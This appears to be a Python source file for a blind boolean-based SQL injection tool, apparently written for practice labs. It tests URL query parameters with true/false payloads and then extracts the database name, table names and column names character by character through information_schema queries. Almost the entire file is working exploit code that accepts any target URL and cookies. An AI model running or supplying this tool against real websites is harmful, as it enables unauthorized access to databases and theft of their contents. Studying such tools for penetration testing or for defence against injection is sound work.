from typing import Literal

import requests
from bs4 import BeautifulSoup
from prettytable import PrettyTable
from requests import Response
from termcolor import colored
import datetime
import random


info = f"[{colored("info", "green")}]"
error = f"[{colored("error", "red")}]"
fatal = f"[{colored("fatal_error", "white", "on_light_red")}]"


def get_time():
    return f"[{colored(f"{datetime.datetime.now().strftime('%H:%M:%S.%f')}", "light_cyan")}]"


# def restrict_values(values: list):
#     def decorator(func):
#         def wrapper(*args, **kwargs):
#             if args and args[0] not in values:
#                 raise ValueError
#             return func(*args, **kwargs)
#
#         return wrapper
#
#     return decorator

def get_hrefs(url: str) -> list:
    a_list = BeautifulSoup(requests.get(url).text, features="html.parser").findAll(name="a", recursive=True)
    href_list = []
    for a in a_list:
        href_list.append(a.get("href"))
    return href_list


def parse_url(url: str):
    if "?" in url:
        pairs = {}
        part = url.split("?")
        if "&" in part[1]:
            params_value_pairs = part[1].split("&")
            for pair in params_value_pairs:
                p = pair.split("=")
                pairs[p[0]] = p[1]
        else:
            p = part[1].split("=")
            pairs[p[0]] = p[1]
        return pairs
    else:
        print(get_time(), fatal, "url中需带有查询参数")


class BooleanInjector:
    def __init__(self, url: str,
                 cookie: dict = None,
                 use_cookie: bool = False,
                 show_payload: bool = False,
                 is_recursive: bool = False):
        """
        :param url: 目标url
        :param cookie: cookie内容,需求类型为字典
        :param use_cookie: 是否使用cookie,bool类型
        :param show_payload: 是否显示成功注入时所使用的payload:bool类型
        :param is_recursive: 是否在
        """
        self.show_payload = show_payload
        self.normal_response: Response = requests.get(url=url, cookies=cookie)
        self.raw_url = url
        self.params_dist = parse_url(url)
        self.params = list(self.params_dist.keys())
        self.values = list(self.params_dist.values())
        self.target_url = url.split("?")[0]
        self.params_count = len(self.params)
        self.use_cookie = use_cookie
        self.cookie = cookie if use_cookie else {}

        self.injectable_params: list = []
        self.injection_types: list = []
        self.injectable_params_count: int = len(self.injectable_params)

        self.hrefs = get_hrefs(self.target_url) if is_recursive else []

        self.db_length = 0
        self.db_name = ""

        self.tables = []
        self.columns, self.rows = {}, {}
        # for pretty_table
        self.ptable = PrettyTable()
        self.ptable.field_names = []

        self.test_injection_points()

        print(get_time(), "\n", f"[{colored("initialization", "light_blue", "on_black")}]", sep="")
        print("url:", self.raw_url)
        print("Cookies:", self.cookie if self.use_cookie else "No Cookies")
        print("params_count:", self.params_count)
        print("params:", self.params)
        print("values:", self.values)
        print("injectable_params_index:", self.injectable_params)
        print("injection_type:", self.injection_types)
        if len(self.injectable_params) == 0:
            print(fatal, "All tested parameters do not appear to be injectable.")
            exit()

    def test_injection_points(self) -> None:
        # injection type: number
        for i in range(0, self.params_count):
            random_int = random.randint(1, 10000)
            payload_true = f"and {random_int}={random_int}#"
            payload_false = f"and {random_int}={random_int + 1}#"
            response_true = self.get_payload_result(payload_true, i, "number")
            response_false = self.get_payload_result(payload_false, i, "number")
            if response_true and not response_false:
                # if self.get_payload_result(payload_true, i, "number"):
                print(get_time(), info, f"Got injectable param:{self.params[i]} (type:number)"
                      f"by using payload:\n{colored(self.construct_payload(payload_false, i, inject_type="number"), "cyan")}" if self.show_payload else "")
                self.injectable_params. append(i)
                self.injection_types.append("number")
            else:
                # injection type: char
                payload_true = f"and '{random_int}'='{random_int}'#"
                payload_false = f"and '{random_int}'='{random_int + 1}'#"
                response_true = self.get_payload_result(payload_true, i, "char")
                response_false = self.get_payload_result(payload_false, i, "char")
                if response_true and not response_false:
                    print(get_time(), info, f"Got injectable param:{self.params[i]} (type:char)",
                          f"by using payload:\n{colored(self.construct_payload(payload_false, i, inject_type="char"), "cyan")}" if self.show_payload else "")
                    self.injectable_params.append(i)
                    self.injection_types.append("char")

    def construct_payload(self,
                          sqli: str,
                          point: int,
                          r: int | None = 0,
                          inject_type: Literal["number", "char"] | None = None
                          ) -> str:
        """
        根据注入点和sql语句组装payload
        :param r: 混淆选项
        :param sqli: 注入的sql语句
        :param point: 选择注入点
        :param inject_type: 注入类型, 如果注入类型未指定，则根据self.injection_type获取注入类型
        :return: 构建好的带有目标url的完整payload
        """
        # get injection type
        if inject_type is None:
            inject_param = self.injectable_params[point]
            if inject_param in self.injectable_params:
                t = self.injection_types[self.injectable_params.index(inject_param)]
            else:
                print(get_time(), fatal, f"unexpected parameter{inject_param}")
                exit()
        else:
            t = inject_type

        payload = f"{self.target_url}?"
        for i in range(0, self.params_count):
            payload += f"{self.params[i]}={self.values[i] + ("'" if t == "char" and i == point else "") + (f" {sqli}" if i == point else "") + ("&" if i != self.params_count - 1 else "")}"

        if r == 1:
            payload = payload.replace(" and ", "+and+").replace("#", "%23").replace("=", "%3D").replace("'", "%27")
            # .replace(" ", "%20")
            for param in self.params:
                payload = payload.replace(f"{param}%3D", f"{param}=")
        # reserve
        # print(payload)
        return payload

    def get_payload_result(self,
                           sqli: str,
                           point: int,
                           inject_type: Literal["number", "char"] | None = None) -> bool:
        """
        :param inject_type: 注入类型
        :param sqli: 具有bool值的sql语句
        :param point: 选择注入点
        :return: 返回布尔值即payload内容是否为真
        """
        for r in range(0, 2):
            payload = self.construct_payload(sqli, point, r, inject_type)
            sqli_response = requests.get(url=payload, cookies=self.cookie)
            # print(get_time(), "[info]", "payload constructed:", payload)
            # 判断条件,可能需要扩展一下以应对更多情况,例如无法确认是否为正确回显
            if self.normal_response.text == sqli_response.text:
                # if self.show_payload:
                # print("\n"+payload)
                return True
        return False
        # for iwebsec
        # return True if "welcome to iwebsec!!!" in sqli_response.text else False

    def get_db_length(self) -> int:
        for point in self.injectable_params:
            for length in range(1, 32):
                payload = f"and length(database()) = {length} #"
                if self.get_payload_result(payload, point):
                    print(get_time(), info, colored(f"Got database name length:", "light_green"),
                          colored(f"{length}", "light_yellow"),
                          end=f"by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}\n"
                          if self.show_payload else "\n")
                    self.db_length = length
                    return length
        print(get_time(), fatal, colored("Unable to get database name length.", "red"))

    def get_db_name(self):
        extracted_name = ""
        payload_list = []
        for point in self.injectable_params:
            print(get_time(), info, "fetching database name...", end="")
            for i in range(1, self.db_length + 1):
                # ?? 或许可以尝试使用二分查找提高效率 ??
                for char in range(32, 127):
                    payload = f"and ascii(substring(database(), {i}, 1))={char} #"
                    if self.get_payload_result(payload, point):
                        print(chr(char), end="", flush=True)
                        payload_list.append(self.construct_payload(payload, point))
                        extracted_name += chr(char)
            print("\n", end="")
            if extracted_name != "":
                self.db_name = extracted_name
                print(get_time(), info, colored("Got database name:", "light_green"),
                      colored(extracted_name, "light_yellow"),
                      end=" by using payloads:\n" if self.show_payload else "\n")
                if self.show_payload:
                    for p in payload_list:
                        print(colored(p, "cyan"))
                break
            else:
                print(get_time(), fatal, colored("unable to get database name length.", "red"))

    def get_tables(self):
        table_count = 0
        table_length = []
        for point in self.injectable_params:
            # get tables count
            print(get_time(), info, "fetching tables count...")
            for count in range(1, 32):
                payload = f"and (select count(table_name) from information_schema.tables where table_schema=database())={count} #"
                if self.get_payload_result(payload, point):
                    print(get_time(), info, colored(f"Got table count:", "light_green"),
                          colored(f"{count} ", "light_yellow"),
                          end=f" by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}\n"
                          if self.show_payload else "\n")
                    table_count = count
                    break
            # get tables length
            for table in range(0, table_count):
                print(get_time(), info, f"fetching No.{table + 1} table length...")
                for length in range(1, 32):
                    payload = f"and length((select table_name from information_schema.tables where table_schema=database() limit {table},1))={length}#"
                    if self.get_payload_result(payload, point):
                        print(get_time(), info, colored(f"Got No.{table + 1} table length:", "light_green"),
                              colored(f"{length}", "light_yellow"),
                              end=f" by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}\n"
                              if self.show_payload else "\n")
                        table_length.append(length)
                        payload_list = []
                        extracted_name = ""
                        # get table name
                        print(get_time(), info, f"fetching No.{table + 1} table name...", end="")
                        for i in range(0, length + 1):
                            for char in range(32, 127):
                                payload = f"and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {table},1),{i},1))={char}#"
                                if self.get_payload_result(payload, point):
                                    print(chr(char), end="", flush=True)
                                    payload_list.append(self.construct_payload(payload, point))
                                    extracted_name += chr(char)
                                    break
                        # fetching finished
                        print("\n", sep="", end="")
                        print(get_time(), info, colored(f"Got No.{table + 1} name:", "light_green"),
                              colored(extracted_name, "light_yellow"),
                              end=" by using payloads:\n" if self.show_payload else "\n")
                        self.tables.append(extracted_name)
                        # self.ptable.field_names.append(extracted_name)
                        if self.show_payload:
                            for p in payload_list:
                                print(colored(p, "cyan"))
                        break
        if len(table_length) == 0:
            print(fatal)

    # @restrict_values(self.tables)
    def get_columns(self):
        for point in self.injectable_params:
            # get column count
            for table in self.tables:
                columns_count = 0  # store the count of column in this table
                for c in range(1, 32):
                    payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0)#"
                    if self.get_payload_result(payload, point):
                        columns_count = c
                        print(get_time(), info, colored(f"Got table[{table}] columns count:", "light_green"),
                              colored(f"{c}", "light_yellow"),
                              end=f" by using payload:\n{colored(payload, "cyan")}\n" if self.show_payload else "\n")
                        break
                # got column counts in this table (not all), then fetch column name length
                for column_index in range(0, columns_count):
                    columns_length = 0
                    for length in range(1, 32):
                        payload = f"and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name='{table}' limit {column_index},1)={length},1,0) #"
                        if self.get_payload_result(payload, point):
                            columns_length = length
                            print(get_time(), info,
                                  colored(f"Got table[{table}] No.{column_index + 1} column length:", "light_green"),
                                  colored(f"{columns_length}", "light_yellow"),
                                  end=f" by using payload:\n{colored(payload, "cyan")}\n" if self.show_payload else "\n")
                            break
                    # got this column name by length
                    extracted_name = ""
                    payload_list = []
                    columns_list = []
                    print(get_time(), info, f"fetching table[{table}] No.{column_index + 1} column name...", end="")
                    for i in range(1, columns_length + 1):
                        for char in range(32, 127):
                            payload = f"and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='{table}' limit {column_index},1),{i},1))={char},1,0) #"
                            if self.get_payload_result(payload, point):
                                extracted_name += chr(char)
                                payload_list.append(self.construct_payload(payload, point))
                                print(chr(char), end="", flush=True)
                                break
                    print("\n", sep="", end="")
                    print(get_time(), info,
                          colored(f"Got table[{table}] No.{column_index + 1} column name:", "light_green"),
                          colored(extracted_name, "light_yellow"),
                          end=" by using payloads:\n" if self.show_payload else "\n")

                    columns_list.append(extracted_name)

                    if self.show_payload:
                        for p in payload_list:
                            print(colored(p, "cyan"))

    def get_all(self):
        self.get_db_length()
        self.get_db_name()
        self.get_tables()
        self.get_columns()

    # !! extremely unstable method, don't use it !!
    # def recursive(self):
    #     for href in self.hrefs:
    #         sqli = BooleanInjector(url=href, cookie=self.cookie, use_cookie=self.use_cookie, show_payload=self.show_payload, is_recursive=True)
    #         sqli.get_all()
    #         sqli.recursive()

    def display(self):
        print(self.ptable)
